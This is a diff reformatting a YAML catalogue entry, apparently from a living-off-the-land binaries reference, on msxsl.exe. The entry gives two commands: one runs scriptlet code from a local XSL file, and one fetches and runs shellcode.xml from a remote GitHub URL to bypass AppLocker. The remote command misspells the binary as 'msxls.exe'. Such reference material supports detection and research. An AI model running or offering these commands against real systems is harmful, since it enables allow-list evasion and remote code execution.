@@ -1,26 +1,16 @@
 ---
+name: msxsl.exe
+description: 
 functions:
   execute:
-    -
-      Name: msxsl.exe
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: msxsl.exe customers.xml script.xsl
-          Description: Run COM Scriptlet code within the script.xsl file (local).
-          Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
-          Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
-      Full_Path:
-          N/A
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://twitter.com/subTee/status/877616321747271680
-          https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
-      Notes: Thanks to Casey Smith - @subTee (Finding), 3gstudent - @3gstudent (Remote)
+    - description: Run COM Scriptlet code within the script.xsl file (local).
+      code: msxsl.exe customers.xml script.xsl
+    - description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+      code: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+resources: 
+    - resource: https://twitter.com/subTee/status/877616321747271680
+    - resource: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
+fullpath: 
+    - path: Missing
+notes: Thanks to Casey Smith - @subTee (Finding), 3gstudent - @3gstudent (Remote)
 ---
